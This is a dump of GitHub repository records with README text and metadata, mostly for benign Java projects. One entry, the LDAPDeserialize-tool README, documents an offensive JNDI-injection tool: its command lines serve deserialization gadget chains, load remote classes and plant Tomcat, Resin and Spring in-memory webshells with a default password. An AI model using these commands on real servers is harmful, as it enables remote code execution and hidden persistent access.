模块。如果它们是通用的、与业务无关的，可以放入`common`模块；如果它们是为了支持业务模块的基础设施，可以放入`infrastructure`模块。

### 特别鸣谢

- [SoybeanJS](https://github.com/soybeanjs)
- [MyBatis-Plus](https://mybatis.plus/)
- [Sa-Token](https://sa-token.cc/)
- [Knife4j](https://doc.xiaominfo.com/)
- [HuTool](https://hutool.cn/)
- 不一一列举，感谢所有开源项目的贡献者

### 开源协议

项目基于 [Apache License 2.0 © 2024 Zhuang Pan](./LICENSE) 协议，仅供学习参考，商业使用请遵循作者版权信息，作者不保证也不承担任何软件的使用风险。",,,2024-04-29T05:50:36Z,2024-09-19T07:40:46Z,2024-09-08T14:39:28Z,3,1,1,41,1,8,40,1,0,Apache-2.0,Java
developer-krushna/Dex-Editor-Android,main,"## My first open source Project 😀🇮🇳
# Dex-Editor-Android
A work-in-progress **DEX** editor for Android, using mainly [smali](https://github.com/google/smali) & [dexlib2](https://github.com/google/smali/tree/main/dexlib2).
## Available decompilers
- [JADX](https://github.com/skylot/jadx)

## Available features 
- [x] Smali navigation.
- [x] Decompile single smali classes 
- [x] Decompiling single method bodies to java
- [x] Batch class deletion
- [x] Smali method flow diagram
- [x] Editing Smali with best code editor 
- [x] Dex compilation with real time progress update
- [x] Supported propper error handling during smali compilation 
- [x] Enhancement in smali library 
- [x] Supported DEX version 40 and 41(Partially)
## Project build by 
- [Sketchware Pro](https://github.com/Sketchware-Pro/Sketchware-Pro) , Java 11 version
  ### Download sample app
  [Dex Editor +](https://t.me/MaharnaTech/83)
  - Note: many features not included on this project repo due to some reason 
## Watch a quick video
https://github.com/developer-krushna/Dex-Editor-Android/assets/76234660/1ad73186-e789-44f6-bdc3-180fc3e3e0c9
## Special thanks to
- [Timscriptov](https://github.com/timscriptov) for helping me in the development of Smali method flow diagram and also thanks for making server rest api ..I am really indebted to him ♥️

- [Sora-Editor] for a beautiful Android TextEditor (https://github.com/Rosemoe/sora-editor)

- Thanks to [Android Prime](https://github.com/abodinagdat16) for helping me a lot in sora editor functionalities

## This project already used in My Project Modder Hub
- [Download Modder Hub](https://modder-hub.blogspot.com)

## Join Telegram
- [Coding Guys](https://t.me/coding_guys)
  
# License and Usage Restrictions

This project is released under the Apache License, Version 2.0. However, please note the following restriction regarding the usage of this code:

- You are strictly prohibited from using this code in private projects.
- Contributions to this project are welcome within this repository only.

For more details on the license terms and usage restrictions, please refer to the LICENSE file.

# License
    Copyright (C) 2024 Krushna Chandra

    Licensed under the Apache License, Version 2.0 (the ""License"");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an ""AS IS"" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
",A work in progress Android dalvik byte code(DEX) editor ,,2024-04-10T14:40:37Z,2024-05-21T08:37:07Z,2024-04-11T09:40:56Z,1,2,0,39,0,11,40,1,0,Apache-2.0,Java
rocketseat-education/nlw-unite-java,main,,Back-end em Java desenvolvido durante o NLW Unite da Rocketseat,,2024-04-01T18:46:20Z,2024-03-29T02:52:20Z,,0,6,1,3,0,18,38,1,0,,Java
C3P0ooo/LDAPDeserialize-tool,main,"## LDAPDeserialize-tool
一款针对高版本JDK的JNDI注入工具

### 依赖环境
JDK8

### 功能描述
#### 使用简述
```shell
反序列化文件方式：java -jar LDAPDeserialize-tool.jar -p 1389 -f D:/1.ser
反序列化base64方式：java -jar LDAPDeserialize-tool.jar -p 1389 -b base64数据
低版本动态请求class：
java -jar LDAPDeserialize-tool.jar -C http://127.0.0.1:8000/1.class
内置反序列化链：
java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c ""calc""
RMI反序列化打法：
java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c ""calc"" -rmi
RMI内置利用链遍历：
java -jar LDAPDeserialize-tool.jar -g execAll -c ""calc"" -rmi -ip 当前服务器公网ip
内存马注入：
java -jar LDAPDeserialize-tool.jar -p 1389 -g fastjson -c TomcatListenerBehinderByLei
```
#### 参数说明
```shell
 -b,--base64 <arg>   反序列化打法：序列化数据base64编码值
 -C,--class <arg>    低版本动态请求class实例化方式：class文件请求URL（需自己生成class文件，开启web服务）
 -c,--cmd <arg>      使用内置反序列化链时所要执行的命令，或指定所要打的内存马类型（存在空格时请使用双引号包裹）
 -f,--file <arg>     反序列化打法：序列化数据文件路径
 -g,--gadget <arg>   内置反序列化链
 -ip,--ip <arg>      VPS-IP地址
 -p,--port <arg>     监听的端口，默认1389
 -path <arg>         内存马路径,格式为/xxx,不传入会生成一个随机地址,listener型内存马不需要
 -rmi,--rmi          rmi反序列化打法，可打JDK20+，只支持内置链打法
```
#### 支持说明
```
【目前支持的链,*号为支持JDK20+的链】
fastjson (依赖：1.2.49-1.2.83)

* CC6 (依赖：<= commons-collections 3.2.1)
CC4 (依赖：commons-collections4 4.0)
jackson (依赖：jackson-databind 2.10.0及以上版本)
jackson2 (稳定版，依赖：jackson-databind 2.10.0及以上版本 && <= spring aop 5.x)
groovy (依赖：groovy 2.3.9)
hibernate (依赖：hibernate 5.x && spring-context &&
                           reactor-core)[hibernate为ClassPathXmlApplication
                           Context执行，'-c'后跟上xml文件WEB地址]
CB192 (依赖：commons-beanutils 1.9.2 && commons-logging 1.2)
CB183 (依赖：commons-beanutils 1.8.3 && commons-logging 1.2)
rome (依赖：Rome 1.0)
execAll (利用链遍历，跑完一次要重新开脚本，依赖：tomcat)

【目前支持的内存马类型】
目前所有内存马默认密码均为：aaa
【Tomcat目前兼容Tomcat8,9】
TomcatListenerBehinder (冰蝎4.1默认马子)
TomcatListenerBehinderByLei (tomcat listener冰蝎马，打入改版的马子，需用改版的冰蝎ByLei)
TomcatListenerCMD (tomcat listener cmd马，http://ip:port/xx/zz?pass=aaa&cmd=whoami)
ResinListenerCMD (Resin listener型CMD内存马)
ResinListenerBehinder (Resin listener型冰蝎4.1内存马)
SpringInterceptorBehinder (Spring Interceptor型冰蝎4.1内存马)
```

### 使用演示
#### 使用指定反序列化文件

使用ysoserial.jar生成序列化文件1.ser，读取该文件启动，客户端访问后将执行反序列化操作

![截图](image/cc370864ddff7bce2c17cdf15b6b2df3.png)

#### 使用指定反序列化数据

使用base64编码后的序列化数据启动

![截图](image/10b93a10ec217bb82424756bc05c413b.png)

#### 使用内置反序列化链

![截图](image/99b85665c9c03cedeb281f5729c6d945.png)

#### 使用RMI反序列化方式

当前RMI反序列化方式仅支持内置的反序列化链

![截图](image/e49210b2672c44f1ba10bd784bbefc56.png)

#### 内存马注入
##### CMD马

![截图](image/Snipaste_2024-08-06_17-10-12.png)

![截图](image/Snipaste_2024-08-06_17-14-38.png)


##### 冰蝎马

![截图](image/image-20240806154150477.png)

![截图](image/Snipaste_2024-08-06_15-43-51.png)

![截图](image/Snipaste_2024-08-06_15-45-48.png)
###### 指定路径
![](image/Snipaste_2024-08-28_23-26-00.png)
![](image/Snipaste_2024-08-28_23-28-04.png)

### TODO
- 增加内存马类型及兼容性

### Star

[![恒星历史图表](https://api.star-history.com/svg?repos=C3P0ooo/LDAPDeserialize-tool&type=Timeline)](https://star-history.com/#C3P0ooo/LDAPDeserialize-tool&Timeline)

![GitHub lerna version](https://img.shields.io/github/lerna-json/v/:user/:repo)
",,,2024-04-02T01:00:53Z,2024-09-24T07:24:42Z,2024-08-28T15:34:39Z,6,3,1,41,0,5,37,1,0,,Java
anuragts/tangerine,main,"# 🍊 tangerine.
## in-memory vector database

tangerine is a in-memory vector database that is designed to have fast read and write speeds.

tangerine is not limited to vector database, as it has its own key-value store written from scratch in Java.

## Key-Value Store

### Installation and Running.

#### Using Docker

```bash
docker run -p 1111:1111 anuragdev123/tangerine-kv:latest
```

#### Manual Installation

Making sh executable
```bash
chmod +x tangerinekv-server.sh
chmod +x tangerinekv-cli.sh
chmod +x tangerinekv-compile.sh
```

> [!NOTE]
> The .java files are already compiled when running the scripts, but to prevent any issues with the classpath, you should compile them first.

```bash
./tangerinekv-compile.sh

```

Running the Tangerine-KV Server

```bash
 ./tangerinekv-server.sh
```

Running the Tangerine-KV Client
```bash
 ./tangerinekv-cli.sh
```
Testing 
```bash
$ SET key value
```
if server responds with `OK`, then the client & server is working.
 

### Commands

#### PING
```bash
$ PING
```

#### SET

```bash
$ SET key value
```

#### GET

```bash
$  GET key
```

#### REMOVE

```bash
$  REMOVE key
```

#### ALL

```bash
$  ALL
```

#### CONTAINS
```bash
$  CONTAINS key
```

#### CLEAR

```bash
$  CLEAR
```

#### EXPIRE

```bash
$  EXPIRE key seconds
```

#### TTL

```bash
$  TTL key
```

#### HELP

```bash
$  HELP
```

#### SUBSCRIBE
```bash
$  SUBSCRIBE topic
```

#### PUBLISH
```bash
$  PUBLISH topic message
```

<!-- #### UNSUBSCRIBE
```bash
$  UNSUBSCRIBE topic
``` -->


for progress and status check TODO.md

## License

MIT",in-memory vector database,,2024-04-21T22:14:51Z,2024-05-04T09:20:17Z,,0,1,6,81,0,0,36,1,0,MIT,Java
LinMoQC/Memory-Core,master,"# Memory-Core
这里是Memory Blog的后端仓库
## 项目结构
```bash
Memory-Core
├── src
│   ├── main
│   │   ├── java
│   │   │   └── com
│   │   │       └── memory
│   │   │           └── blog
│   │   │               ├── aspect 切面
│   │   │               ├── config 配置
│   │   │               ├── controller 控制器 
│   │   │               ├── dao 数据访问层 ，和 mapper 冲突
│   │   │               ├── entity 实体类 
│   │   │               ├── enums 枚举
│   │   │               ├── exception 异常,TODO
│   │   │               ├── interceptor 拦截器
│   │   │               ├── mapper mapper接口
│   │   │               ├── service 
│   │   │               ├── utils
│   │   │               └── ServerApplication.java 启动类
│   │   └── resources
│   │       ├── com.linmoblog.server.mapper mapper文件
│   │       ├── db-init 数据库初始化文件
│   │       ├── MATE-INF 
│   │       ├── application.yml 通用配置
│   │       ├── application-dev.yml 开发环境配置
│   │       ├── application-prod.yml 生产环境配置
│   │       └── logback-spring.xml

```

## 使用
```bash
cd && mkdir -p Memory/core && cd $_
mkdir -p db_init
wget -O db_init/init.sql https://cdn.jsdelivr.net/gh/LinMoQC/Memory-Core@master/db_init/init.sql
wget https://cdn.jsdelivr.net/gh/LinMoQC/Memory-Core@master/docker-compose.yml
docker-compose up -d

初始账号：
admin
123456
```
## 增加 sys_config 表保存配置信息
在 application.yml 中的配置可以写到 sys_config 表中（除了数据库配置，一般用于存储业务配置），这样可以在数据库或者后台管理界面修改项目配置（TODO）。
config_key 对应配置的 key，config_value 对应配置的 value。
## 文件存储
文件存储目前继承了本地文件存储、阿里云 OSS 文件存储，后续会扩展更多的文件存储方式（Github、Gitee）
同时只支持一种文件存储方式，如果配置了多种文件存储方式，则会有报错提示。
> 说人话就是 ali.enable 和 local.enable 只能有一个为 true。
### 阿里云 OSS 文件存储
在 application.yml 中修改配置
```yml
ali:
  enable: true # 是否启用阿里云 OSS 文件存储
  endpoint: xxx # OSS endpoint 
  accessKeyId: xxx # OSS accessKeyId
  accessKey: xxx # OSS accessKey
  bucketName: xxx # OSS bucketName
  uploadPath: xxx # OSS uploadPath
```


### 本地文件存储
在 application.yml 中修改配置
```yml
local:
  enable: true # 是否启用本地文件存储
  uploadDir: xxx # 本地文件存储路径, 例如：/usr/local/upload 或 upload-dir 。
```
## 一些规范
### 异常体系
1. 在 Service 层不推荐使用直接返回 Result 对象的方法，最佳方式是抛出 CommonException 异常，GlobalExceptionHandler.java 中会统一拦截 CommonException 异常，并将其转换为包含错误信息的 Result 对象返回。
2. 在 Controller 层使用 Result 对象直接返回。
> 具体示例参照 ImageController

## 环境搭建
### minio搭建
推荐使用 `docker` 进行安装。
命令如下：
```shell
# 创建文件夹
mkdir /home/minio
cd /home/minio
mkdir data 
mkdir config

# 运行容器
docker run --name minio \
-p 9000:9000 \
-p 9999:9999 \
-d --restart=always \
-e ""MINIO_ROOT_USER=memory"" \
-e ""MINIO_ROOT_PASSWORD=memory"" \
-v /home/minio/data:/data \
-v /home/minio/config:/root/.minio \
minio/minio server /data \
--console-address '0.0.0.0:9999'
```
",这里是Memory Blog的后端仓库,,2024-04-05T01:43:07Z,2024-05-06T04:57:53Z,,0,4,2,77,2,11,35,3,1,,Java
GeyserExtras/GeyserExtras,master,"# NOTICE: 2.0 supporting Fabric, Bungee, and Velocity natively without the Spigot server requirement on versions 1.12+ coming soon. Join the discord for the latest news. Spigot will still be supported.

# GeyserExtras

A plugin which attempts to unify features for Bedrock Edition players on Java Edition Servers with GeyserMC, aswell as other handy features for Bedrock Players.

[![generic](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/documentation/generic_vector.svg)](https://github.com/GeyserExtras/GeyserExtras/wiki)
[![discord-singular](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/social/discord-singular_vector.svg)](https://discord.gg/2FfuShKQgy)

[![modrinth](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/available/modrinth_vector.svg)](https://modrinth.com/plugin/geyserextras) 
[![hangar](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/available/hangar_vector.svg)](https://hangar.papermc.io/GeyserExtras/GeyserExtras)
[![github](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/available/github_vector.svg)](https://github.com/GeyserExtras/GeyserExtras/releases)

![spigot](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/supported/spigot_vector.svg)
![paper](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact-minimal/supported/paper_vector.svg)
![purpur](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact-minimal/supported/purpur_vector.svg)

![bungeecord](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/supported/bungeecord_vector.svg)
![waterfall](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact-minimal/supported/waterfall_vector.svg)

![velocity](https://cdn.jsdelivr.net/npm/@intergrav/devins-badges@3/assets/compact/supported/velocity_vector.svg)

## Feature Support Table
**Server** refers to a Spigot-Based server with GeyserExtras, Geyser and Floodgate installed.

**Proxy** refers to a Bungee/Velocity proxy with GeyserExtras, Geyser and Floodgate installed, with the backend server being a Spigot-Based server with GeyserExtras and the `proxy-mode` option set to `true` with only Floodgate installed. 

|Feature                     |Server|Proxy|
|---------------------------|------|-----|
|Java Cooldown              |🟢    |🟢   |
|Java Combat Sounds         |🟢    |🟢   |
|Block Ghosting Fix         |🟢    |🟢   |
|Speed Bridge Fix           |🟢    |🟢   |
|Quick-Menu                 |🟢    |🟢   |
|Resource Pack Loading      |🟢    |🔴   |
|Bedrock Emote Chat         |🟢    |🟢   |
|Auto-Reconnect             |🟢    |🟢   |
|Nether Roof Fix Fog Fix    |🟢    |🟢   |
|Geyser Commands in /ge menu|🟢    |🔴   |

## Features

### Java Edition Combat Improvements
- Cooldown Indicator![An video showing the two types of Attack Indicators, attack and hot-bar, in the GeyserExtras plugin.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/indicator.gif?raw=true)
- Combat Sounds, sweep attack, crit, strong, knockback.
  
### Bedrock Emote Chat for Java Edition players.
Java players can toggle this by typing `/emotechat`.

### Quick-Menu
- Players can bind whatever emotes they want to whatever commands are in the plugins config.
- e.g, /geyser offhand, /geyser statistics, /customcommandhere, anything that can be ran by the player can be ran by the Quick-Menu.
  ![An video showing the GeyserExtras Quick-Menu Feature.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/quickmenu.gif?raw=true)
  
### Optional Pack Loading
- Players can load whatever packs are placed under `optionalpacks/` in the GeyserExtras Folder via the GeyserExtras Menu (`/ge`).
  ![An video showing the GeyserExtras Optional Packs Feature.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/resourcepacks.gif?raw=true)

### Skin Saving
- The plugin can automatically save player skins to the plugins folder under `skins/playerUUID/textureid.png`.
- Please note that this is only the skin that Floodgate converts for Java Players meaning that some marketplace skins like 128x128 skins or classic skins with weird geometry may not look 100% identical.

### Player List
- The player list from Java Edition (usually bound to Tab) has been recreated inside of a ServerForm. This can be accessed in the GeyserExtras Menu (`/ge`) or via `/playerlist` on Bedrock Edition.
  ![An image showing the Player List in GeyserExtras.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/playerlist.png?raw=true)

### Platform List
- A simple command which shows what platforms players are on.
- `/platformlist` | `/platforms`

![An image showing the Platform List in GeyserExtras.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/platformslist.png?raw=true)
## Fixes

### Crop Sound Fix

Crops now play the Java Edition sound for breaking and placing.

### Nether Roof Fix Fog Fix

Fixes the fog to not be the same red fog when Geyser has `above-bedrock-nether-building: true`.

![An video showing the Nether Roof Fix Fog Fix in GeyserExtras.](https://github.com/GeyserExtras/GeyserExtras/blob/master/preview/netherrooffixfogfix.gif?raw=true)

### Arrow Delay Fix

Fixes the arrows to no longer be delayed when shooting, however this has the downside of making the arrows movement look very choppy. Players can configure this for themselves using the GeyserExtras Menu.

## Permissions
```yaml
permissions:
  geyserextras.menu:
    default: true
    description: Allow players to execute the /geyserextras command
  geyserextras.platformlist:
    default: true
    description: Allow players to execute the /platformlist command
  geyserextras.playerlist:
    default: true
    description: Allow players to execute the /playerlist command
  geyserextras.emotechat:
    default: true
    description: Allow players to execute the /emotechat command
```
## Plans
[Trello](https://trello.com/b/9UHPTQST)
  
## Bugs
- Sweep attack sometimes plays even if the player didn't sweep attack.
",A plugin which attempts to unify features for Bedrock Edition players on Java Edition Servers with GeyserMC.,,2024-04-28T06:59:45Z,2024-08-04T07:14:23Z,2024-08-03T15:40:26Z,7,1,1,69,5,9,34,2,0,MIT,Java
Aditya-Mishra19/TCS-NQT-2024-Coding-Solutions,main,,,,2024-04-27T15:49:33Z,2024-07-16T13:23:34Z,,0,2,1,27,0,8,34,1,0,,Java
beyond-aion/aion-server,4.8,"![Aion 4.8 Banner](https://github.com/beyond-aion/aion-server/assets/1169307/494205be-399a-4e2e-8435-1f0774d92262)
<div align=""center"">

  ![](https://img.shields.io/badge/dynamic/xml?url=https%3A%2F%2Fgithub.com%2Fbeyond-aion%2Faion-server%2Fraw%2F4.8%2Fgame-server%2Fpom.xml&query=%2F*%5Blocal-name()%3D%22project%22%5D%2F*%5Blocal-name()%3D%22build%22%5D%2F*%5Blocal-name()%3D%22plugins%22%5D%2F*%5Blocal-name()%3D%22plugin%22%5D%5B*%5Blocal-name()%3D%22artifactId%22%5D%2Ftext()%20%3D%20'maven-compiler-plugin'%5D%2F*%5Blocal-name()%3D%22configuration%22%5D%2F*%5Blocal-name()%3D%22release%22%5D%2Ftext()&label=Java%20version)
  [![](https://img.shields.io/github/contributors-anon/beyond-aion/aion-server)](https://htmlpreview.github.io/?https://gist.github.com/neon-dev/ce9729bcacaac31f78771b8521512d0a/raw/contributors.html&repo=beyond-aion/aion-server&title=Beyond%20Aion%20Server%20Contributors)
  ![](https://img.shields.io/github/repo-size/beyond-aion/aion-server)

</div>

# Aion 4.8 Server Emulator

This is the server for the MMORPG *Aion: The Tower of Eternity* that we host for our players.  
Our server emulator is intended to be faithful to the original experience of the official servers of the time, but a few custom features have also been implemented to meet the needs of our community.  
You can read more about it here:
<details>
<summary><b>Motivation and features of this server emulator (click to show)</b></summary>

### Motivation
In the early years of the game, from 2009 onwards, there were larger and more organized development teams. When we started, in 2015, those days were long gone.  
The few people with extensive knowledge about the different Aion-Emu[^1] forks know this already. Aion server emulators are barely functional: Many systems have been left unfinished, some have design problems, and incomplete or incorrect template data is the rule, not the exception. What seems to work at first breaks down when you introduce trivial variables such as players playing the game or running the server for more than a few
hours.  

We wanted to change this and create an emulator this wonderful game deserves.  
The base for our project was Aion-Lightning's server for Aion version 4.7.5, which was considered the best emulator at the time. Unfortunately, while it was less buggy than emulators from other groups, it turned out to be in a similarly terrible state.  
Once we opened the server to our community, many more core issues came to light, all of which led to our decision to prioritize bug fixes and optimizations over features or version updates. So we just updated once, to version 4.8 (again with the help of Aion-Lightning's work), and stuck to our plan.  

### Highlights
The following is a very incomplete list of some notable things we have worked on:

#### Custom features
- PvPvE map with increased AP rates and boss spawns
- Solo instance ""Eternal Challenge"" with a boss using the same skills and tactics like you, based on a deep learning AI
- Customizations to drop lists, QoL improvements, player commands and various PvP and PvE rewards you can read more about [here](https://beyond-aion.com/page/features)

#### Fixes and enhancements
- Fixed geo[^2] related issues like wrong or missing obstacles, incorrect bound calculations, terrain checks, doors, shields, environmental effects, etc.
- Fixed map kicks and other unintended positioning from various skills, some even client-induced (now worked around by the server)
- Implemented missing instances and reworked some
- Fixed hundreds of quests
- Added thousands of missing drops and spawns
- Fixed drop rate calculations and improved the global drop system (removed npc_drop.dat support)
- Fixed duplicate or unintentionally invisible spawns, temporary spawns and added support for temporary spawns in instances and events
- Fixed the event engine and added new features like automatic buffs or config overrides
- Removed, merged or reworked many chat commands, implemented descriptions, common error handling and a permission aware `.help` command
- Implemented true invisibility against anti hide hacks
- Fixed many stat and skill related issues with players and NPCs
- Implemented more AI handler events and controls like queueing of skills
- Fixed countless core bugs of various severities, like wrong chance calculations, login problems or even client crashes
- Fixed memory leaks, concurrency related issues and more, so the server no longer needs to be restarted every few hours (runs nicely for months now)
- Development related:
  - Simplified configuration and added support for more data types, including lists and maps
  - Logging improvements: Added support for Discord webhooks and revised all error logging (no missing stack traces anymore or meaningless messages)
  - Optimized startup time and implemented class file caching for even faster startup if handlers haven't been modified since the last start
  - Continuous optimizations for a more light-weight and more efficient server (removal of unnecessary code or dependencies, refactoring, etc.)
  - Regular Java and dependency updates for the latest improvements and new language features

### Outlook

Fast-forward to today and there are still many unfinished tasks, bugs and ideas for improvements. Too many to even try listing them. A project of this size will never be finished by a few people developing it in their spare time.  
Which is fine, because we enjoy working on it.

</details>

**TL;DR**: A lot of work has been put into improving this emulator. Not only for our players, but also for a better experience when developing.

> [!TIP]  
> If you have questions about [contributing](https://github.com/beyond-aion/aion-server/blob/HEAD/.github/CONTRIBUTING.md) or if you are interested in technical discussions about Aion and its server development, you can join our **development-focused Discord**: [![Discord Join Link](https://img.shields.io/badge/Discord-5865f2?logo=discord&logoColor=white)](https://beyond-aion.com/dev-talk)  
> 
> **Please note that we do not provide any support related to hosting your own server, but you can ask the community for help in [Discussions > Q&A](https://github.com/beyond-aion/aion-server/discussions/categories/q-a)**

## Building
This project uses [Maven](https://maven.apache.org/what-is-maven.html) to manage dependencies. The game server, login server and chat server can be
built using `mvn package` from the root directory.  
The resulting zip files in each server's target folder can be deployed on any system with a suitable JDK and access to a MySQL (or MariaDB) server.  

## Configuration
### Server setup
The servers can be run with the default config after initializing the databases with the *.sql file in each server's sql folder (default DB names
and users can be found in `config/network/database.properties`).  
To whitelist the game server connection to the login server, enter its ID, IP mask and password in the `gameserver` table of the login server
database.  
If you want to change some configs, it's recommended to create the files `config/mycs.properties` (chat server), `config/mygs.properties` (game 
server) and `config/myls.properties` (login server) and put all your custom properties in there. These take precedence over the standard 
*.properties files and will not be modified when updating the server.  

### Game client setup
You can download the game client for this version from [here](https://mega.nz/folder/wxMRXZDS#qMsKJlkyYUNp_TQln2EZlg).  
As it blocks connections to non-official servers, it needs to be patched. This can be done by copying
this [version.dll](https://github.com/beyond-aion/aion-version-dll/releases/latest) into the bin32 and bin64 folders of the game client.  
To run the game, create a file called `start.bat` in the game's root directory with the following content:
```batch
start /affinity 7FFFFFFF """" ""bin64\AION.bin"" -ip:127.0.0.1 -port:2106 -cc:2 -lang:ENG -loginex
```
<sup>The `-lang` parameter accepts any language installed in the l10n folder. The affinity mask ensures that no more than 31 CPU cores are assigned to the
process, as the game client does not support more.</sup>  

## Developing
Import the root directory as a Maven project. If your IDE does not support [EditorConfig](https://editorconfig.org/#pre-installed) natively, install a
plugin for it to ensure a consistent coding style.  
To start a server, create a run/debug configuration with the `*Server` class as the main class. The chat server for example starts from
`ChatServer.java`. The working directory needs to be set to the module directory (`$MODULE_WORKING_DIR$` in IntelliJ).   
If your IDE compiles very slowly, the compiler likely needs more memory. The option is called ""Build process heap size"" in IntelliJ.


[^1]: [Aion-Emu](https://web.archive.org/web/20100128222712/http://aion-emu.com/) was the first server development project for the game and laid the foundation for all the popular server emulators known today.  
[^2]: Geo or geo data is the common term for collision data parsed from the game client. Collision data for this server is created with our [GeoBuilder](https://github.com/beyond-aion/aion-geobuilder).  "," Aion server emulator with focus on correctness, stability and efficiency ","aion,server-emulator",2024-04-14T14:23:24Z,2024-09-22T04:20:20Z,,0,6,7,5456,0,30,33,4,2,GPL-3.0,Java
galliumdata/adumbra,master,"# The Adumbra library
Adumbra is a light-weight Java library that uses
[steganography](https://en.wikipedia.org/wiki/Steganography)
to hide data in bitmaps using a secret key. 
Supported input formats include PNG, JPEG, TIFF, BMP.
Output formats are PNG and TIFF only, because other
formats are lossy and therefore more difficult to support.

Adumbra requires a bitmap with about 500 pixels
for every byte of the secret message, so a bitmap of
500x700 pixels could contain a secret message 
of up to about 700 bytes. The maximum size of the secret
message is 32K bytes.

Adumbra is intended to be used as more of a way
to mark bitmaps in a non-obvious way, rather than as 
an efficient way to transmit large amounts of secret data.

## How does it work?
Adumbra hides a secret message in a bitmap by distributing
the message's bits into the least significant bit of some pixels,
using one color per pixel (R, G or B) in a pattern
determined by the secret key.

Before being encoded into the bitmap, the message is 
encrypted using a secure hash of the secret key.

Adumbra can also randomize the least significant bits 
of other pixels to make it more difficult to determine 
whether the bitmap contains a secret message, and 
how long that message may be. With that option,
even if someone had access to the original bitmap,
they still would not be able to decode the secret message
without the secret key because they could not determine
if a changed bit belongs to the secret message or is just noise.

## How secure is this?
This library has not been reviewed by cryptography experts,
so you should exercise common sense -- do not rely on it
to hide national security secrets.

As always with encryption, the length of the secret key is
important: using a short key is less secure than a longer key.
The randomness of the key is also a factor. In general,
using a secret key of at least 40 random characters should
give you excellent secrecy. If you just want to mark a bitmap in a non-obvious
way without worrying about NSA-level adversaries, 15 or 20
random characters should be plenty.

There are two main obstacles to decoding a secret message:
### Determining that a bitmap contains a message
An attacker who analyzes the modified bitmap may be able to determine
that the bitmap contains some suspicious noise, but it would be
difficult to be certain unless they have access to the original
bitmap.
### Decoding the secret message
Even with the original bitmap, without the secret key, 
an attacker would have a difficult time to
figure out which bits actually belong to the secret message.
Even if they did, they would then have to decrypt the message,
which is encoded using a SHA-512 hash of the secret key.

## Removing the secret message
Keep in mind that it is fairly easy to scramble a secret message
hidden in a bitmap -- all you have to do is save the bitmap
with a bit of compression. In most cases, that will make the
secret message unrecognizable.

## Command line usage
### Encoding a message in a bitmap
```
java -jar adumbra-<version>.jar encode \
    <input-file> \
    <output-file> \
    <message> \
    <key> \
    [<format> [<secure-level>]]
```
- `<input-file>`: a bitmap file. 
Supported input formats are those supported by your Java platform,
and usually include: `png`, `jpeg`, `tiff`, `bmp`
- `<output-file>`: the file in which to write the bitmap 
with the hidden message
- `<message>`: the message to be encoded in the bitmap
- `<key>`: the secret key used to hide the message
- `<format>`: optional, the format of the output file. 
If not specified, the format of the input file will be used,
but only ""png"" and ""tiff"" are allowed because other formats
are lossy.
- `<secure-level>`: optional, an integer between 0 and 2.
Zero means minimum security, no noise is added to the image,
which means, depending on the bitmap, it may be easy to
detect that the image contains secret data, and how long that
data is. One adds some noise, but with some repetition,
making it much more difficult to determine that the bitmap 
contains secret data. Two adds fully random noise, which is
even more secure, but is somewhat slower.

### Example
Encode a message into a bitmap file:
```
java -jar adumbra-0.9.jar encode MyImage.jpeg Output.png \
    ""My secret message"" ""6buovMtowrAuNYw"" png 1
```
## Extract a secret message from a bitmap file:
```
java -jar adumbra-0.8.jar decode Output.png \
""6buovMtowrAuNYw""
```
Output:
```
Hidden message: My secret message
```

## Library usage
This is a stand-alone library, it has no dependencies.

[Javadoc is here](https://javadoc.io/doc/com.galliumdata.adumbra/adumbra/latest/com/galliumdata/adumbra/package-summary.html)

### Maven:
```
<dependency>
    <groupId>com.galliumdata.adumbra</groupId>
    <artifactId>adumbra</artifactId>
    <version>0.9</version>
</dependency>
```
### Encoding in Java
```
Encoder encoder = new Encoder(2);
FileInputStream inStr = new FileInputStream(""MyImage.jpg"");
FileOutputStream outStr = new FileOutputStream(""ModifImage.png"");
byte[] message = ""This is the message"".getBytes(StandardCharsets.UTF_8);
String key = ""This is the secret key"";
encoder.encode(inStr, outStr,  ""png"", message, key, ""png"", 1);
outStr.close();
// Result is in file ModifImage.png
```

### Decoding in Java
```
Decoder decoder = new Decoder();
FileInputStream inStr = new FileInputStream(""ModifImage.png"");
byte[] decoded = decoder.decode(inStr, ""This is the secret key"");
System.out.println(new String(decoded));
// Output: This is the message
```

# About the author
Adumbra was developed while working on 
[Gallium Data](https://www.galliumdata.com)
to allow invisible watermarking of bitmaps stored in databases.
It is open source with an Apache 2.0 license.
",A light-weight Java library that uses steganography to hide data in bitmaps using a secret key,steganography,2024-04-29T19:31:49Z,2024-05-08T00:47:27Z,,0,1,0,6,0,0,33,2,0,Apache-2.0,Java
boozallen/aissemble,dev,"# aiSSEMBLE&trade;
[![Documentation](https://img.shields.io/badge/documentation-GitHub_Pages-blue)](https://boozallen.github.io/aissemble/aissemble/current/index.html)
[![Maven Central](https://img.shields.io/maven-central/v/com.boozallen.aissemble/aissemble-root.svg)](https://search.maven.org/#search%7Cgav%7C1%7Cg%3A%22com.boozallen.aissemble%22%20AND%20a%3A%22aissemble-root%22)
![PyPI](https://img.shields.io/pypi/v/aissemble-foundation-core-python?logo=python&logoColor=gold)
![PyPI - Python Version](https://img.shields.io/pypi/pyversions/aissemble-foundation-core-python?logo=python&logoColor=gold)
